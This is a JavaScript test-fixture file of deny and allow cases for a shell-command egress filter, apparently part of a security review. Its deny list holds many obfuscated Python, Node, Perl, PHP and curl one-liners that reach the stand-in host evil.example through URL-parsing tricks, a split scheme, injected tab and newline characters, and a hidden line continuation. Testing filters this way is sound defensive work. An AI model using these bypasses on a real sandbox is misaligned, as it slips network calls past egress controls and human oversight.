// Card 44167c0b, fix round 1: the shapes of the security review (B1-B5), one list for the vitest suite
// (bash-egress-concat.test.ts) and the corpus rows (concat.jsonl, ids CC-R1-*). Strings only: nothing here
// is executed, no socket is opened.
//   host: a substring that must appear in one of the reported `hosts` (the real host where the parser can
//   read it, else the open-host / split-scheme marker).
const Q = "'"
const BT = '`'
const BS = '\\'
const NL = '\n'
const TAB = '\t'
const py = (code) => `python3 -c "import urllib.request as u; ${code}"`
const CURL = 'cu' + 'rl https://evil.example/'

// [id, family, cmd, reason, host]
export const R1_DENY = [
  // B1: a literal continuation behind the PORT reaches evil.example (userinfo / port confusion).
  ['B1a', 'CODE', `python3 -c "import requests; requests.get(${Q}http://localhost:3420${Q} ${Q}@evil.example/x${Q})"`, 'one-liner-external', '<open host: localhost'],
  ['B1b', 'CODE', `node -e "require(${Q}http${Q}).get(${Q}http://localhost:3420${Q} + ${Q}@evil.example/x${Q})"`, 'one-liner-external', '<open host: localhost'],
  ['B1c', 'CODE', `python3 -c "import requests; requests.get(${Q}https://api.github.com:${Q} ${Q}@evil.example/x${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B1d', 'CODE', `node -e "fetch(${Q}https://api.github.com:${Q} + ${Q}pass@evil.example/${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B1e', 'CODE', `node -e "fetch(${Q}https://api.github.com:443${Q} + ${Q}@evil.example/${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B1f', 'CODE', `node -e "fetch(${Q}https://api.github.com:x${Q} + ${Q}@evil.example/${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B1g', 'CODE', `node -e "fetch(${Q}http://localhost:3420${Q} + ${Q}@evil.example/x${Q})"`, 'one-liner-external', '<open host: localhost'],
  ['B1h', 'CODE', `python3 <<${Q}EOF${Q}${NL}import urllib.request as u${NL}u.urlopen((${Q}http://localhost:3420${Q}${NL}  ${Q}@evil.example/x${Q}))${NL}EOF`, 'heredoc-external', '<open host: localhost'],
  ['B1i', 'CODE', `perl -MLWP::Simple -e ${Q}get("http://localhost:3420"."${BS}@evil.example")${Q}`, 'one-liner-external', '<open host: localhost'],
  ['B1j', 'CODE', `php -r "file_get_contents(${Q}http://localhost:3420${Q} . ${Q}@evil.example${Q});"`, 'one-liner-external', '<open host: localhost'],
  // After the port: a second ':', letters, a method call, an f-string placeholder followed by userinfo.
  ['B1k', 'CODE', py(`u.urlopen(${Q}http://localhost:3420:8080${Q})`), 'one-liner-external', '<open host: localhost'],
  ['B1l', 'CODE', py(`u.urlopen(${Q}http://localhost:3420${Q}.concat(${Q}@evil.example${Q}))`), 'one-liner-external', '<open host: localhost'],
  ['B1m', 'CODE', py(`p=1; u.urlopen(f${Q}http://localhost:{p}@evil.example/x${Q})`), 'one-liner-external', 'evil.example'],
  ['B1n', 'CODE', py(`u.urlopen((${Q}http://localhost:3420${Q}) + ${Q}@evil.example${Q})`), 'one-liner-external', '<open host: localhost'],
  // B2: TAB, CR and LF never close a host (WHATWG URL deletes them), raw or in a template literal / heredoc.
  ['B2a', 'CODE', `node -e "fetch(${Q}https://api.github.com${TAB}.evil.example/x${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B2b', 'CODE', `node -e ${Q}fetch(${BT}https://api.github.com${NL}.evil.example/x${BT})${Q}`, 'one-liner-external', '<open host: api.github.com'],
  ['B2c', 'CODE', `node -e "require(${Q}https${Q}).get(${Q}https://api.github.com${TAB}.evil.example/x${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B2d', 'CODE', `node <<${Q}EOF${Q}${NL}fetch(${BT}https://localhost${NL}.evil.example/x${BT})${NL}EOF`, 'heredoc-external', '<open host: localhost'],
  ['B2e', 'CODE', `python3 -c "import requests; requests.get(${Q}http://localhost${TAB}.evil.example/x${Q})"`, 'one-liner-external', '<open host: localhost'],
  ['B2f', 'CODE', `node -e ${Q}fetch(${BT}https://api.github.com\r${NL}.evil.example/x${BT})${Q}`, 'one-liner-external', '<open host: api.github.com'],
  ['B2g', 'CODE', `node -e ${Q}fetch(${BT}https://localhost:3420${NL}@evil.example/x${BT})${Q}`, 'one-liner-external', '<open host: localhost'],
  // The same as an ESCAPE inside the literal (the backslash already opens the host).
  ['B2h', 'CODE', `node -e "fetch(${Q}https://api.github.com${BS}t.evil.example/x${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B2i', 'CODE', `node -e "fetch(${Q}https://api.github.com${BS}n.evil.example/x${Q})"`, 'one-liner-external', '<open host: api.github.com'],
  ['B2j', 'CODE', py(`u.urlopen(${Q}http://localhost${BS}r.evil.example${Q})`), 'one-liner-external', '<open host: localhost'],
  // B3: the scheme split over literals, no `scheme:` + quote anywhere.
  ['B3a', 'CODE', py(`u.urlopen(${Q}http${Q}+${Q}:${Q}+${Q}//evil.example/x${Q})`), 'one-liner-external', '<split scheme>'],
  ['B3b', 'CODE', py(`u.urlopen(${Q}https${Q} ${Q}:/${Q} ${Q}/evil.example/x${Q})`), 'one-liner-external', '<split scheme>'],
  ['B3c', 'CODE', `python3 -c "import urllib.request as u; u.urlopen(${Q}http${Q} + ${Q}:${Q} + ${Q}//evil.example/x${Q})"`, 'one-liner-external', '<split scheme>'],
  ['B3d', 'CODE', `node -e "fetch(${Q}https${Q} + ${Q}:/${Q} + ${Q}/evil.example/x${Q})"`, 'one-liner-external', '<split scheme>'],
  ['B3e', 'CODE', `node -e "fetch(${Q}https${Q}.concat(${Q}:${Q}, ${Q}//evil.example/${Q}))"`, 'one-liner-external', '<split scheme>'],
  ['B3f', 'CODE', `python3 <<${Q}EOF${Q}${NL}import urllib.request as u${NL}u.urlopen(${Q}http${Q} ${Q}:${Q} ${Q}//evil.example/x${Q})${NL}EOF`, 'heredoc-external', '<split scheme>'],
  ['B3g', 'CODE', `node -e "fetch(['wss', ':', '//evil.example/x'].join(''))"`, 'one-liner-external', '<split scheme>'],
  ['B3h', 'CODE', `node -e ${Q}fetch(${BT}https${BT}+${BT}:${BT}+${BT}//evil.example${BT})${Q}`, 'one-liner-external', '<split scheme>'],
  // B5: the line after an escaped backslash is a command of its own (reason: the line's own command).
  ['B5a', 'CURL', `echo a${BS}${BS}${NL}${CURL}`, null, 'evil.example'],
  ['B5b', 'CURL', `echo a${BS}${BS}${BS}${BS}${NL}${CURL}`, null, 'evil.example'],
  ['B5c', 'CURL', `echo a${BS}${BS}\r${NL}${CURL}`, null, 'evil.example'],
  ['B5d', 'CURL', `true${BS}${BS}${NL}${CURL}`, null, 'evil.example'],
  ['B5e', 'CURL', `echo a${BS}${BS}${BS}${BS}${BS}${BS}${NL}python3 -c "import urllib.request as u; u.urlopen('https://evil.example')"`, null, 'evil.example'],
]

// [id, family, cmd]: must stay allowed.
export const R1_ALLOW = [
  // B4: the shell's closing quote behind `)` is not a string continuation.
  ['B4a', 'CODE', `node -e "fetch(${Q}https://api.github.com${Q})"`],
  ['B4b', 'CODE', `node -e ${Q}fetch("https://api.github.com")${Q}`],
  ['B4c', 'CODE', `python3 -c "import urllib.request as u; u.urlopen(${Q}http://127.0.0.1${Q})"`],
  ['B4d', 'CODE', `node -e "fetch(${Q}http://localhost:3420${Q})"`],
  ['B4e', 'CODE', `python3 -c "import urllib.request as u; print(u.urlopen(${Q}http://localhost:3420${Q}).status)"`],
  // A port, then a path literal or a variable operand: still one complete authority.
  ['B1o', 'CODE', `node -e "fetch(${Q}http://localhost:3420${Q} + ${Q}/api/health${Q})"`],
  ['B1p', 'CODE', `node -e "fetch(${Q}http://localhost:3420${Q} + ${Q}?x=1${Q})"`],
  ['B1q', 'CODE', py(`p='/x'; u.urlopen((${Q}http://127.0.0.1:3420${Q}) + p)`)],
  ['B1r', 'CODE', py(`port=3420; u.urlopen(${Q}http://localhost:${Q} + str(port))`)],
  ['B1s', 'CODE', `node -e ${Q}fetch(${BT}http://localhost:\${3420}/api/health${BT})${Q}`],
  // B2: a plain space closes a host; a newline behind a host followed by a space-indented line does too.
  ['B2k', 'CODE', `python3 <<${Q}EOF${Q}${NL}import urllib.request as u${NL}# base http://localhost:3420${NL}  ${NL}u.urlopen(${Q}http://localhost:3420/x${Q})${NL}EOF`],
  // B5: one or three backslashes make a real continuation: the second line is an argument of echo.
  ['B5f', 'CURL', `echo a${BS}${NL}${CURL}`],
  ['B5g', 'CURL', `echo a${BS}${BS}${BS}${NL}${CURL}`],
  // A lone `':'` literal with no scheme literal beside it, and a protocol-relative word that is no URL.
  ['B3j', 'CODE', py(`h=${Q}localhost:3420${Q}.split(${Q}:${Q}); u.urlopen(${Q}http://localhost:3420/x${Q})`)],
]
